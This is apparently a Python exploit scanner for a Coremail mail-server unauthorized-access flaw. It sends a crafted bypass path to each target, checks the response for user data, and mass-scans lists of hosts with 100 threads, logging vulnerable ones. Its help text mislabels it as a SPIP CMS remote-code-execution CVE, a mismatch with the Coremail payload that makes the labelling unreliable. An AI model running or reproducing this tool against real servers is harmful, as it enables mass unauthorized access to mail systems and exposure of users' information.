import argparse,requests
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def banner():
    test = """
                                                           ______
            ______________________________________________ ___  /
            ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
            __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
            _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
            /_/                                                  
                                               author:lly
                                               date:2024-09-3
                                               version:1.0                    
            """
    print(test)

def poc(target):
    payload = '/coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
    }

    try:
        res1 = requests.get(url=target+payload, headers=headers, verify=False,timeout=10)
        if 'username' in res1.text:
            with open('result.txt', 'a') as f:
                f.write(f'{target}\n')
                print(f'[+]该{target}存在未授权访问漏洞')
        else:
            print(f'[-]该{target}不存在未授权访问漏洞')
    except Exception as e:
        print(e)


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="CVE-2023-27372 SPIP CMS远程代码执行漏洞")

    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")



if __name__ == '__main__':
    main()
